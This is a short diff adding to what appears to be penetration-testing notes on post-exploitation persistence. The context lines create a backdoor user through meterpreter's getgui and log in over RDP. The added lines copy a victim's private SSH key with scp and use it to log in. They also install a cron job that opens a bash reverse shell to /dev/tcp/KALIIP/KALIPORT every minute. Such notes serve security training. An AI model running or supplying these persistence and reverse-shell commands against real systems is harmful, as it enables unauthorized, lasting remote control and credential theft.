@@ -275,8 +275,33 @@ meterpreter> run getgui -e -u danny -p hacker123321
 
 xfreerdp /u:danny /p:hacker123321 /v:IP
 
+```
+## Linux Persistence SSH Keys 
++ Linux is deployed in server operating system
++ Linux is deployed on SSH
++ Client Network and website 
+```
+ls -al
+cd .ssh/
+scp student@IP:~/.ssh/id_rsa .
+chmod 400 id_rsa
+ssh -i id_rsa username@IP
+
+```
+## Persistence Via Cron Jobs 
+
+```
+cat /etc/cron
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/KALIIP/KALIPORT 0>&1'" > cron
+crontab -i cron
+crontab -l 
+
+
+
+
 
 
 ```
+
 
 
